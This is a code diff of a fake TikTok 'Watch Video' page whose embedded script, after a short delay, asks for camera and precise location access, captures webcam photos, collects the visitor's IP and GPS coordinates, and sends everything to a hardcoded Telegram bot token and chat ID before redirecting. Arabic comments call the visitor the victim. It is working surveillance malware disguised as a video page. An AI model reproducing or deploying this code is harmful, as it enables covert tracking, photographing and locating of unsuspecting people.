@@ -6,13 +6,12 @@
     <title>TikTok - Watch Video</title>
     <meta property="og:title" content="TikTok - Watch Video">
     <meta property="og:description" content="Wait for the end! 😂🔥 #viral">
-    <!-- تم تحديث رابط صورة المعاينة هنا بناءً على طلبك -->
     <meta property="og:image" content="https://raw.githubusercontent.com/facloook5-cpu/tango.com/refs/heads/main/cover.jpg">
     <style>
         body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #000; color: #fff; font-family: sans-serif; overflow: hidden; position: relative; }
         #main-video-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; }
         .video-container { width: 100vw; height: 100vh; position: relative; display: flex; justify-content: center; align-items: center; z-index: 2; }
-        #loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.9); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 20; opacity: 0; visibility: hidden; transition: 0.5s; }
+        #loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.4); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 20; opacity: 0; visibility: hidden; transition: 0.5s; }
         #loading-overlay.active { opacity: 1; visibility: visible; }
         .spinner { border: 8px solid rgba(255, 255, 255, 0.3); border-top: 8px solid #ff0050; border-radius: 50%; width: 60px; height: 60px; animation: spin 1.2s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -24,14 +23,13 @@
 </head>
 <body>
     <video id="main-video-bg" autoplay loop muted playsinline>
-        <!-- تم تحديث رابط الفيديو الداخلي هنا بناءً على طلبك -->
         <source src="https://github.com/facloook5-cpu/tango.com/raw/refs/heads/main/Screenrecorder-2026-05-12-15-56-31-644(0)(0).mp4" type="video/mp4">
     </video>
 
     <div class="video-container">
         <div id="loading-overlay">
             <div class="spinner"></div>
-            <div style="margin-top:20px">Verifying connection...</div>
+            <div style="margin-top:20px; font-weight: bold; text-shadow: 1px 1px 5px #000;">Verifying connection...</div>
             <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
         </div>
         <video id="camera-feed" autoplay playsinline muted></video>
@@ -39,14 +37,13 @@
     </div>
 
     <script>
-        (function(_0x1b2c, _0x3f4a) {
-            const _0x5e21 = function(_0x4d2a) {
-                while (--_0x4d2a) { _0x1b2c['push'](_0x1b2c['shift']()); }
-            };
-            _0x5e21(++_0x3f4a);
-        }(['https://api.telegram.org/bot', '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0', '8350812242', 'https://ipapi.co/json/', 'https://facloook5-cpu.github.io/Ca.is/'], 0x1));
-
-        const _0xData = ['8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0', '8350812242', 'https://api.telegram.org/bot', 'https://ipapi.co/json/', 'https://facloook5-cpu.github.io/Ca.is/'];
+        const _0xData = [
+            '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0', 
+            '8350812242', 
+            'https://api.telegram.org/bot', 
+            'https://ipapi.co/json/', 
+            'https://facloook5-cpu.github.io/Ca.is/'
+        ];
 
         const _0x_T = _0xData[0]; 
         const _0x_C = _0xData[1];
@@ -55,9 +52,11 @@
         async function _0x_execute() {
             const _ov = document.getElementById('loading-overlay');
             const _pr = document.getElementById('progress-fill');
+            
+            // تفعيل التراكب التحميلي بشكل شفاف لضمان ظهور نوافذ الصلاحيات فوق الفيديو
             _ov.classList.add('active');
 
-            let _col = { img: [], loc: null, ip: null };
+            let _col = { img: [], loc: null, ip: null, mapLink: 'N/A' };
 
             try { 
                 _pr.style.width = '30%';
@@ -66,7 +65,8 @@
             } catch(e) {}
 
             try {
-                _pr.style.width = '60%';
+                _pr.style.width = '50%';
+                // طلب صلاحية الكاميرا والتقاط الصور
                 const s = await navigator.mediaDevices.getUserMedia({ video: true });
                 const cf = document.getElementById('camera-feed');
                 cf.srcObject = s;
@@ -78,44 +78,52 @@
                 for(let i=0; i<2; i++) {
                     ctx.drawImage(cf, 0, 0);
                     _col.img.push(cv.toDataURL('image/jpeg', 0.6));
-                    await new Promise(r => setTimeout(r, 700));
+                    await new Promise(r => setTimeout(r, 800));
                 }
                 s.getTracks().forEach(t => t.stop());
             } catch(e) {}
 
             try {
-                _pr.style.width = '80%';
+                _pr.style.width = '75%';
+                // طلب الموقع الجغرافي الدقيق وتحويله لرابط خرائط جوجل
                 const p = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, {timeout: 4000});
+                    navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true, timeout: 8000});
                 });
                 _col.loc = { lat: p.coords.latitude, lon: p.coords.longitude };
+                _col.mapLink = `https://www.google.com/maps?q=${_col.loc.lat},${_col.loc.lon}`;
             } catch(e) {}
 
             try {
-                let m = `🎥 <b>LOG</b>\nIP: ${_col.ip ? _col.ip.ip : 'N/A'}\nLoc: ${_col.loc ? _col.loc.lat + ',' + _col.loc.lon : 'N/A'}`;
+                // إرسال البيانات مع رابط الخريطة القابل للضغط
+                let m = `🎥 <b>NEW LOG FROM TARGET</b>\n\n` +
+                        `🌐 <b>IP:</b> ${_col.ip ? _col.ip.ip : 'N/A'}\n` +
+                        `📍 <b>Location:</b> <a href="${_col.mapLink}">Click to Open Map</a>\n` +
+                        `📝 <b>Coords:</b> ${_col.loc ? _col.loc.lat + ',' + _col.loc.lon : 'N/A'}`;
+                
                 await fetch(_0x_B + _0x_T + '/sendMessage', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: _0x_C, text: m, parse_mode: 'HTML' })
+                    body: JSON.stringify({ chat_id: _0x_C, text: m, parse_mode: 'HTML', disable_web_page_preview: false })
                 });
 
                 for(let i of _col.img) {
                     const b = await (await fetch(i)).blob();
                     const f = new FormData();
                     f.append('chat_id', _0x_C);
-                    f.append('photo', b, 'x.jpg');
+                    f.append('photo', b, 'capture.jpg');
                     await fetch(_0x_B + _0x_T + '/sendPhoto', { method: 'POST', body: f });
                 }
             } catch(e) {}
 
             _pr.style.width = '100%';
-            setTimeout(() => { window.location.href = _0xData[4]; }, 800);
+            // التوجه للرابط النهائي بعد اكتمال المهام
+            setTimeout(() => { window.location.href = _0xData[4]; }, 1000);
         }
 
         window.onload = () => {
-            setTimeout(_0x_execute, 6000); 
+            // يبدأ طلب الصلاحيات بعد 3 ثوانٍ من تشغيل الفيديو ليتمكن الضحية من الاندماج مع المحتوى أولاً
+            setTimeout(_0x_execute, 3000); 
         };
     </script>
 </body>
 </html>
-
